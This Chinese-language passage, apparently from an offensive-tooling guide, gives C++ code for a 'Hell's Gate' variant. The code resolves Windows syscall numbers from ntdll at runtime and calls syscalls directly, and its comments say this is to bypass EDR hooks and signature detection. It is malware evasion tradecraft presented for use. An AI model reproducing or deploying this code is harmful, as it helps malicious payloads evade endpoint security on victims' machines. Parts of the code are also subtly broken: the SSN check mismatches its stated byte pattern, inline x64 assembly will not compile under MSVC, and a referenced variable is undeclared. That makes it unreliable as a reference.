## 1. Syscall 直调（绕 ntdll hook）

```cpp
// syscalls.h - 动态解析 SSN，避免静态 sycall 号被特征匹配
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);

// Hell's Gate 变体：遍历 ntdll 导出表找 Zw* 系列取 SSN
#define UP -32
#define DOWN 32

WORD GetSSN(const char* funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* base = (BYTE*)GetProcAddress(ntdll, funcName);
    // mov eax, SSN 模式：4c 8b d1 b8 xx xx 00 00
    if (*(WORD*)(base + 0x03) == 0x00b8) {
        return *(WORD*)(base + 4);
    }
    // 相邻 syscall 兜底搜索
    for (int i = 1; i < 500; i++) {
        if (*(WORD*)(base + 0x03 + UP * i) == 0x00b8)
            return *(WORD*)(base + 4 + UP * i);
        if (*(WORD*)(base + 0x03 + DOWN * i) == 0x00b8)
            return *(WORD*)(base + 4 + DOWN * i);
    }
    return 0;
}

// 内联 syscall stub，编译后无 ntdll 调用特征
__declspec(naked) NTSTATUS SyscallInvoker() {
    __asm {
        mov r10, rcx
        mov eax, [ssn_slot]      // 全局存 SSN
        syscall
        ret
    }
}
